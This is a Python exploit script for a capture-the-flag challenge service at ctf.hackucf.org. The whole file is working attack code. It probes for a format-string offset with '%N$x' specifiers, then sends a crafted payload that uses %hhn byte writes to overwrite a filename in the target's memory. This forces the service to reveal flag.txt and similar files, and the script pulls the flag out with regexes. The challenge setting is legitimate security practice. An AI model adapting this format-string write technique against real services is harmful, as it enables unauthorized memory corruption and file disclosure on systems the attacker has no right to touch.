#!/usr/bin/env python3
import re
import socket
import struct
from typing import Optional


HOST = "ctf.hackucf.org"
PORT = 20008


def recv_all(s: socket.socket, limit: int = 1_000_000) -> bytes:
    s.settimeout(3.0)
    chunks = []
    total = 0
    while True:
        try:
            data = s.recv(4096)
        except socket.timeout:
            break
        if not data:
            break
        chunks.append(data)
        total += len(data)
        if total >= limit:
            break
    return b"".join(chunks)


def query(payload: bytes) -> bytes:
    with socket.create_connection((HOST, PORT), timeout=3.0) as s:
        _ = recv_all(s)  # banner/prompt
        s.sendall(payload)
        return recv_all(s)


def find_base_idx(max_i: int = 400) -> int:
    target = b"41414141"
    # Fewer connections: scan in chunks using positional specifiers.
    start = 1
    step = 12
    while start <= max_i:
        idxs = list(range(start, min(start + step, max_i + 1)))
        fmt = "AAAA." + ".".join(f"%{i}$x" for i in idxs) + "\n"
        out = query(fmt.encode())
        if target in out:
            # Identify exact index by matching in-order fields.
            try:
                line = next(l for l in out.splitlines() if b"Searching for:" in l)
            except StopIteration:
                start += step
                continue
            after = line.split(b"AAAA.", 1)[1]
            fields = after.split(b".")
            vals = []
            for f in fields:
                if re.fullmatch(rb"[0-9a-fA-F]+", f):
                    vals.append(f.lower())
            for i, v in zip(idxs, vals):
                if v == target:
                    return i
        start += step
    raise RuntimeError("base_idx not found")


def build_payload(base_idx: int, filename8: bytes = b"flag.txt") -> bytes:
    if len(filename8) != 8:
        raise ValueError("filename8 must be exactly 8 bytes")

    # Byte-wise writes: far less output than %hn padding.
    addrs = [0x0804B370 + i for i in range(8)]  # b370..b377
    prefix = b"".join(struct.pack("<I", a) for a in addrs)

    idxs = [base_idx + i for i in range(8)]

    dummy = 6  # arg6 points to our buffer; ok for %c and %hhn
    cur = len(prefix)  # bytes printed before first '%'
    fmt = ""

    for target_byte, idx in zip(filename8, idxs):
        pad = (target_byte - (cur % 0x100)) % 0x100
        if pad:
            fmt += f"%{dummy}${pad}c"
            cur += pad
        fmt += f"%{idx}$hhn"

    # NUL-terminate our search phrase at buffer[0] (empty string matches everything)
    pad5 = (-cur) % 0x100
    if pad5:
        fmt += f"%{dummy}${pad5}c"
        cur += pad5
    fmt += f"%{dummy}$hhn"

    return prefix + fmt.encode() + b"\n"


def extract_flag(out: bytes) -> Optional[str]:
    m = re.search(rb"FLAG\{[^}]+\}", out)
    if m:
        return m.group(0).decode(errors="replace")
    # common alternative
    m = re.search(rb"flag\{[^}]+\}", out)
    if m:
        return m.group(0).decode(errors="replace")
    m = re.search(rb"sun\{[^}]+\}", out)
    if m:
        return m.group(0).decode(errors="replace")
    return None


def main() -> None:
    base_idx = find_base_idx()
    candidates = [
        b".data\x00\x00\x00",
        b"flag.txt",
        b"logs.txt",
    ]
    for name in candidates:
        payload = build_payload(base_idx, name)
        out = query(payload)
        flag = extract_flag(out)
        if flag:
            print(flag)
            return
        # If file exists but doesn't contain flag, still surface a strong line
        if b"Found match:" in out:
            # print last match line for operator visibility
            lines = [l for l in out.splitlines() if b"Found match:" in l]
            if lines:
                print(lines[-1].decode(errors="replace"))
                return
    raise SystemExit("no flag found")


if __name__ == "__main__":
    main()

